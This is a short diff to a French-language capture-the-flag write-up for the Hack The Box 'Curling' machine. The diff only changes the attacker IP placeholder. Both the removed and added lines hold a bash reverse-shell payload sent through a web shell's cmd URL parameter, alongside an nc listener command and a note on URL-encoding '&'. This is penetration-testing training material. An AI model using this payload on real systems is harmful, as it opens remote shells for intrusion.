@@ -708,7 +708,7 @@ rlwrap -cAr nc -lvnp 4444
 Puis via le navigateur :
 
 ```url
-http://curling.htb/?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.X/4444 0>%261'
+http://curling.htb/?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.x.X/4444 0>%261'
 ```
 
 > Les caractères `%26` correspondent à l’encodage URL du caractère `&`, nécessaire ici pour transmettre correctement la commande via l’URL.
